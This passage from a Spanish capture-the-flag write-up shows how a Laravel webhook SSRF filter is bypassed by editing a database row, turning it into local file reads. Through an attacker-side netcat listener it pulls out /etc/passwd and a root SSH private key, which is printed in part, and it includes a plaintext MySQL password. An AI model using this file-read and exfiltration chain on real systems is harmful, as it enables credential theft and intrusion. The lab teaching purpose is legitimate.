+<span class="mtk1">            </span><span class="mtk7 mtki">Task</span><span class="mtk5">::</span><span class="mtk8">destroy</span><span class="mtk1">($id);</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">)</span><span class="mtk5">-&gt;</span><span class="mtk8">with</span><span class="mtk1">(</span><span class="mtk4">'message'</span><span class="mtk1">, </span><span class="mtk4">'The webhook was deleted!'</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        $validatedData </span><span class="mtk5">=</span><span class="mtk1"> $request</span><span class="mtk5">-&gt;</span><span class="mtk8">validate</span><span class="mtk1">([</span>
+<span class="mtk1">            </span><span class="mtk4">'webhookUrl'</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> [</span><span class="mtk4">'required'</span><span class="mtk1">, </span><span class="mtk4">'url'</span><span class="mtk1">, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">SafeUrlRule</span><span class="mtk1">()],</span>
+<span class="mtk1">            </span><span class="mtk4">'monitoredUrl'</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> [</span><span class="mtk4">'required'</span><span class="mtk1">, </span><span class="mtk4">'url'</span><span class="mtk1">, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">SafeUrlRule</span><span class="mtk1">()],</span>
+<span class="mtk1">            </span><span class="mtk4">'frequency'</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk4">'required'</span><span class="mtk1">,</span>
+<span class="mtk1">            </span><span class="mtk4">'onlyError'</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk4">'required|boolean'</span>
+<span class="mtk1">        ]);</span>
+
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ($action </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"Test"</span><span class="mtk1">) {</span>
+<span class="mtk1">            $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">HealthChecker</span><span class="mtk5">::</span><span class="mtk8">check</span><span class="mtk1">($request</span><span class="mtk5">-&gt;</span><span class="mtk1">webhookUrl, $request</span><span class="mtk5">-&gt;</span><span class="mtk1">monitoredUrl, $request</span><span class="mtk5">-&gt;</span><span class="mtk1">onlyError);</span>  
+
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($res[</span><span class="mtk4">"health"</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> $res[</span><span class="mtk4">"health"</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"up"</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">)</span><span class="mtk5">-&gt;</span><span class="mtk8">with</span><span class="mtk1">(</span><span class="mtk4">'message'</span><span class="mtk1">, </span><span class="mtk4">'The host is healthy!'</span><span class="mtk1">);</span>
+<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">)</span><span class="mtk5">-&gt;</span><span class="mtk8">with</span><span class="mtk1">(</span><span class="mtk4">'error'</span><span class="mtk1">, </span><span class="mtk4">'The host is not healthy!'</span><span class="mtk1">);</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">            $show </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">Task</span><span class="mtk5">::</span><span class="mtk8">create</span><span class="mtk1">($validatedData);</span>
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/webhook/'</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $show</span><span class="mtk5">-&gt;</span><span class="mtk1">id)</span><span class="mtk5">-&gt;</span><span class="mtk8">with</span><span class="mtk1">(</span><span class="mtk4">'message'</span><span class="mtk1">, </span><span class="mtk4">'Webhook is successfully created'</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+
+
+<span class="mtk1">    </span><span class="mtk3">/**</span>
+<span class="mtk3">     * Display the specified resource.</span>
+<span class="mtk3">     *</span>
+<span class="mtk3">     * </span><span class="mtk5">@param</span><span class="mtk3"> </span><span class="mtk5">int</span><span class="mtk3"> $id</span>
+<span class="mtk3">     * </span><span class="mtk5">@return</span><span class="mtk3"> \Illuminate\Http\</span><span class="mtk7 mtki">Response</span>
+<span class="mtk3">     */</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">show</span><span class="mtk1">($id)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">        </span><span class="mtk3">//</span>
+<span class="mtk1">    }</span>
+
+
+<span class="mtk1">}</span>
+</code></pre></div><p>Hay una regla llamada <code>SafeUrlRule</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ cat app/Rules/SafeUrlRule.php  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">App\Rules</span><span class="mtk1">;</span>
+
+<span class="mtk5">use</span><span class="mtk1"> Illuminate\Contracts\Validation\</span><span class="mtk7 mtki">Rule</span><span class="mtk1">;</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">SafeUrlRule</span><span class="mtk1"> </span><span class="mtk5">implements</span><span class="mtk1"> </span><span class="mtk8 mtki mtku">Rule</span>
+<span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> $msg </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk3">/**</span>
+<span class="mtk3">     * Create a new rule instance.</span>
+<span class="mtk3">     *</span>
+<span class="mtk3">     * </span><span class="mtk5">@return</span><span class="mtk3"> </span><span class="mtk5">void</span>
+<span class="mtk3">     */</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk7">__construct</span><span class="mtk1">()</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">        </span><span class="mtk3">//</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk3">/**</span>
+<span class="mtk3">     * Determine if the validation rule passes.</span>
+<span class="mtk3">     *</span>
+<span class="mtk3">     * </span><span class="mtk5">@param</span><span class="mtk3"> </span><span class="mtk5">string</span><span class="mtk3"> $attribute</span>
+<span class="mtk3">     * </span><span class="mtk5">@param</span><span class="mtk3"> </span><span class="mtk5">mixed</span><span class="mtk3"> $value</span>
+<span class="mtk3">     * </span><span class="mtk5">@return</span><span class="mtk3"> </span><span class="mtk5">bool</span>
+<span class="mtk3">     */</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">passes</span><span class="mtk1">($attribute, $value)</span>
+<span class="mtk1">    {</span>
+
+<span class="mtk1">        $host </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">parse_url</span><span class="mtk1">($value, </span><span class="mtk7">PHP_URL_HOST</span><span class="mtk1">);</span>
+
+<span class="mtk1">        $ip </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">ip2long</span><span class="mtk1">(</span><span class="mtk7">gethostbyname</span><span class="mtk1">($host));</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">ip2long</span><span class="mtk1">(</span><span class="mtk4">'127.0.0.0'</span><span class="mtk1">) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">24</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> ($ip </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">24</span><span class="mtk1">) </span><span class="mtk5">or</span>
+<span class="mtk1">        </span><span class="mtk7">ip2long</span><span class="mtk1">(</span><span class="mtk4">'192.168.0.0'</span><span class="mtk1">) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> ($ip </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">or</span>
+<span class="mtk1">        </span><span class="mtk7">ip2long</span><span class="mtk1">(</span><span class="mtk4">'10.10.11.0'</span><span class="mtk1">) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> ($ip </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">or</span>
+<span class="mtk1">        </span><span class="mtk7">ip2long</span><span class="mtk1">(</span><span class="mtk4">'10.129.0.0'</span><span class="mtk1">) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> ($ip </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">or</span>
+<span class="mtk1">        </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> ($ip </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">24</span><span class="mtk1">)) {</span>
+<span class="mtk1">            </span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">msg </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"The host given in the </span><span class="mtk1">$attribute</span><span class="mtk4"> field is not allowed"</span><span class="mtk1">;</span>  
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk3">/**</span>
+<span class="mtk3">     * Get the validation error message.</span>
+<span class="mtk3">     *</span>
+<span class="mtk3">     * </span><span class="mtk5">@return</span><span class="mtk3"> </span><span class="mtk5">string</span>
+<span class="mtk3">     */</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">message</span><span class="mtk1">()</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9">$this</span><span class="mtk5">-&gt;</span><span class="mtk1">msg;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>La función anterior filtra algunos <em>payloads</em> de SSRF. Sin embargo, la funcionalidad de <em>webhook</em> funciona de la siguiente manera: se guarda la tarea en la base de datos, luego se realiza la tarea, y finalmente se elimina la tarea de la base de datos.</p><p>El controlador que realiza las peticiones es <code>HealthChecker</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ cat app/Http/Controllers/HealthChecker.php  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">App\Http\Controllers</span><span class="mtk1">;</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">HealthChecker</span>
+<span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">check</span><span class="mtk1">($webhookUrl, $monitoredUrl, $onlyError </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+
+<span class="mtk1">        $json </span><span class="mtk5">=</span><span class="mtk1"> [];</span>
+<span class="mtk1">        $json[</span><span class="mtk4">'webhookUrl'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> $webhookUrl;</span>
+<span class="mtk1">        $json[</span><span class="mtk4">'monitoredUrl'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> $monitoredUrl;</span>
+
+<span class="mtk1">        $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">@</span><span class="mtk7">file_get_contents</span><span class="mtk1">($monitoredUrl, </span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ($res) {</span>
+
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> ($onlyError) {</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> $json;</span>
+<span class="mtk1">            }</span>
+
+<span class="mtk1">            $json[</span><span class="mtk4">'health'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"up"</span><span class="mtk1">;</span>
+<span class="mtk1">            $json[</span><span class="mtk4">'body'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> $res;</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($http_response_header)) {</span>
+<span class="mtk1">            $headers </span><span class="mtk5">=</span><span class="mtk1"> [];</span>
+<span class="mtk1">            $json[</span><span class="mtk4">'message'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> $http_response_header[</span><span class="mtk6">0</span><span class="mtk1">];</span>
+
+<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> ($i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; $i </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk7">count</span><span class="mtk1">($http_response_header) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">; $i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+
+<span class="mtk1">                $split </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">, $http_response_header[$i], </span><span class="mtk6">2</span><span class="mtk1">);</span>
+
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">count</span><span class="mtk1">($split) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) {</span>
+<span class="mtk1">                    $headers[</span><span class="mtk7">trim</span><span class="mtk1">($split[</span><span class="mtk6">0</span><span class="mtk1">])] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">trim</span><span class="mtk1">($split[</span><span class="mtk6">1</span><span class="mtk1">]);</span>
+<span class="mtk1">                } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                    </span><span class="mtk7">error_log</span><span class="mtk1">(</span><span class="mtk4">"invalid header pair: </span><span class="mtk1">$http_response_header</span><span class="mtk4">[</span><span class="mtk1">$i</span><span class="mtk4">]</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
+<span class="mtk1">                }</span>
+
+<span class="mtk1">            }</span>
+
+<span class="mtk1">            $json[</span><span class="mtk4">'headers'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> $headers;</span>
+<span class="mtk1">            }</span>
+
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">            $json[</span><span class="mtk4">'health'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"down"</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        $content </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">json_encode</span><span class="mtk1">($json);</span>
+
+<span class="mtk1">        </span><span class="mtk3">// send</span>
+<span class="mtk1">        $curl </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">curl_init</span><span class="mtk1">($webhookUrl);</span>
+<span class="mtk1">        </span><span class="mtk7">curl_setopt</span><span class="mtk1">($curl, </span><span class="mtk6">CURLOPT_HEADER</span><span class="mtk1">, </span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">curl_setopt</span><span class="mtk1">($curl, </span><span class="mtk6">CURLOPT_RETURNTRANSFER</span><span class="mtk1">, </span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">curl_setopt</span><span class="mtk1">($curl, </span><span class="mtk6">CURLOPT_HTTPHEADER</span><span class="mtk1">,</span>
+<span class="mtk1">            </span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">"Content-type: application/json"</span><span class="mtk1">));</span>
+<span class="mtk1">        </span><span class="mtk7">curl_setopt</span><span class="mtk1">($curl, </span><span class="mtk6">CURLOPT_POST</span><span class="mtk1">, </span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk7">curl_setopt</span><span class="mtk1">($curl, </span><span class="mtk6">CURLOPT_POSTFIELDS</span><span class="mtk1">, $content);</span>
+<span class="mtk1">        </span><span class="mtk7">curl_exec</span><span class="mtk1">($curl);</span>
+<span class="mtk1">        </span><span class="mtk7">curl_close</span><span class="mtk1">($curl);</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> $json;</span>
+
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Está empleando <code>file_get_contents</code>, por lo que podemos leer archivos locales. Para ello, tenemos que configurar un <em>webhook</em> y rápidamente cambiar el campo <code>monitoredUrl</code> a una ruta local, de forma que recibamos el contenido del archivo local.</p><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Vamos a conectarnos a MySQL:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ mysql --user=laravel --password=MYsql_strongestpass@2014+  
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 3802
+Server version: 5.7.39-0ubuntu0.18.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| laravel            |
++--------------------+
+2 rows in set (0.01 sec)
+
+mysql&gt; use laravel;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++------------------------+
+| Tables_in_laravel      |
++------------------------+
+| failed_jobs            |
+| migrations             |
+| password_resets        |
+| personal_access_tokens |
+| tasks                  |
+| users                  |
++------------------------+
+6 rows in set (0.00 sec)
+
+mysql&gt; describe tasks;
++--------------+--------------+------+-----+---------+-------+
+| Field        | Type         | Null | Key | Default | Extra |
++--------------+--------------+------+-----+---------+-------+
+| id           | char(36)     | NO   | PRI | NULL    |       |
+| webhookUrl   | varchar(255) | NO   |     | NULL    |       |
+| onlyError    | tinyint(1)   | NO   |     | NULL    |       |
+| monitoredUrl | varchar(255) | NO   |     | NULL    |       |
+| frequency    | varchar(255) | NO   |     | NULL    |       |
+| created_at   | timestamp    | YES  |     | NULL    |       |
+| updated_at   | timestamp    | YES  |     | NULL    |       |
++--------------+--------------+------+-----+---------+-------+
+7 rows in set (0.00 sec)
+
+mysql&gt; select * from tasks;
+Empty set (0.00 sec)
+</code></pre></div><p>Si creamos una tarea con la aplicación web, la encontraremos después en la base de datos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mysql&gt; select * from tasks;
++--------------------------------------+--------------------+-----------+--------------------+-----------+---------------------+---------------------+  
+| id                                   | webhookUrl         | onlyError | monitoredUrl       | frequency | created_at          | updated_at          |
++--------------------------------------+--------------------+-----------+--------------------+-----------+---------------------+---------------------+
+| 6e5970e4-3829-4081-bd29-bacd5b1975ba | http://10.10.17.44 |         0 | http://10.10.17.44 | * * * * * | yyyy-mm-dd hh:mm:ss | yyyy-mm-dd hh:mm:ss |
++--------------------------------------+--------------------+-----------+--------------------+-----------+---------------------+---------------------+
+1 row in set (0.00 sec)
+</code></pre></div><p>Ahora, cambiamos el campo <code>monituredUrl</code> a un archivo local como <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mysql&gt; update tasks set monitoredUrl = '/etc/passwd';  
+Query OK, 0 rows affected (0.00 sec)
+Rows matched: 1  Changed: 0  Warnings: 0
+</code></pre></div><p>Y recibimos el contenido de <code>/etc/passwd</code> de vuelta, por lo que hemos transformado el SSRF en una lectura de archivos locales:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.176.
+Ncat: Connection from 10.10.11.176:42280.
+POST / HTTP/1.1
+Host: 10.10.17.44
+Accept: */*
+Content-type: application/json
+Content-Length: 1940
+Expect: 100-continue
+
+{"webhookUrl":"http:\/\/10.10.17.44","monitoredUrl":"\/etc\/passwd","health":"up","body":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\npollinate:x:109:1::\/var\/cache\/pollinate:\/bin\/false\nsshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin\nsusanne:x:1000:1000:susanne:\/home\/susanne:\/bin\/bash\ngogs:x:1001:1001::\/home\/gogs:\/bin\/bash\nmysql:x:111:114:MySQL Server,,,:\/nonexistent:\/bin\/false\n"}  
+</code></pre></div><p>En este punto, podemos probar si estamos leyendo archivos como <code>root</code>. Por ejemplo, podemos ver si existe una clave privada de SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mysql&gt; update tasks set monitoredUrl = '/root/.ssh/id_rsa';  
+Query OK, 1 row affected (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.176.
+Ncat: Connection from 10.10.11.176:52864.
+POST / HTTP/1.1
+Host: 10.10.17.44
+Accept: */*
+Content-type: application/json
+Content-Length: 1818
+Expect: 100-continue
+
+{"webhookUrl":"http:\/\/10.10.17.44","monitoredUrl":"\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2